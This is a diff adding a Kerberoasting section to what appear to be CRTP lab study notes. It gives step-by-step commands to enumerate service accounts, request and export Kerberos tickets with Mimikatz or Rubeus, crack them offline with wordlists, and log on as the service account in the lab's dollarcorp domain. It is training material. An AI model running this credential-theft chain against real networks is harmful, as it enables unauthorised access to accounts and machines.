@@ -2036,3 +2036,47 @@ klist
 ```
 gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
 ```
+
+# Priv Esc - Kerberoast
+The idea of this technique is that we are looking for users who have the authority to implement a specific service on a specific device, so I will exploit this service in order to obtain the user’s TGS and crack it using the tgscrack tool. After that, we will enter the device.
+1. Find user accounts used as service accounts
+```
+. ./GetUserSPNs.ps1
+Get-NetUser -SPN
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22e930c3-6c7f-4e78-be63-5d30babc6a8a)
+
+the svcadmin user has a privilege on the MSSQLsvc service on the dcrop-mgmt.dollarcorp.moneycorp.local
+2. Request a TGS
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/25d264e1-d269-4b4e-b451-5958e477da65)
+3. Export ticket using Mimikatz or using Rubeus
+```
+Invoke-Mimikatz -Command '"Kerberos::list /export"'
+OR
+Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+```
+Don't forget to delete the port number from the Kerberos hash file
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/141f3f34-0949-42c6-ae3f-2aaa61e349bf)
+
+4. Crack the ticket using tgscrack or using john
+```
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+OR
+john.exe --wordlist=C"\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1ecb64fc-cdae-4d36-9bb3-b9738a1e0777)
+5. Luanch a new PowerShell session using svcadmin username and his password
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b15b7264-7304-4c97-87a0-8d3c3ae6175a)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c067715b-f197-4eed-9b3f-b9de6509333d)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/15d626de-73bb-47d3-a338-0ad0328a044d)
+ 6. now try to access the dcorp-mgm device
+ ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/efd84534-6ff7-4c0b-a404-584962a1011f)
+
+you were able to access the dcorp-mgmt device through the svcadmin user because he can execute the MSSQLsvc service in the dcrop-mgmt deivce
